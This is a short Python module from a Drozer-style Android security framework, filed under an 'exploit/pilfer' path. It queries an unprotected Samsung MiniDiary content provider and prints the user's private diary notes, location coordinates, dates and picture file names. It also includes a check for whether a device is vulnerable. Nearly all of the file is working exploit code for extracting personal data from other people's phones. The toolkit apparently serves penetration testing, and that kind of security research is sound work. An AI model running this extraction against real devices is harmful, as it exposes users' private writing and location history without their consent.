from mwr.droidhg.modules import common, Module

class MiniDiary(Module, common.Provider, common.TableFormatter, common.Vulnerability):

    name = "Tests for Content Provider vulnerability in com.sec.android.app.minidiary."
    description = "Tests for Content Provider vulnerability in com.sec.android.app.minidiary."
    examples = ""
    author = "Tyrone (@mwrlabs)"
    date = "2012-11-06"
    license = "MWR Code License"
    path = ["exploit", "pilfer", "oem", "samsung"]

    label = "Note entries from MiniDiary (com.sec.android.app.minidiary)"
    
    def exploit(self, arguments):
        c = self.getCursor()
        
        if c != None:
            rows = self.getResultSet(c)

            self.print_table(rows, show_headers=True)
        else:
            self.stdout.write("Unknown Error.\n")

    def getCursor(self):
        return self.contentResolver().query("content://com.sec.android.providers.minidiary.MiniDiaryData/diary", projection=["_id", "location", "date", "longitude", "latitude", "picture_file", "note"])

    def isVulnerable(self, arguments):
        cursor = self.getCursor()

        return cursor != None and cursor.getCount() > 0
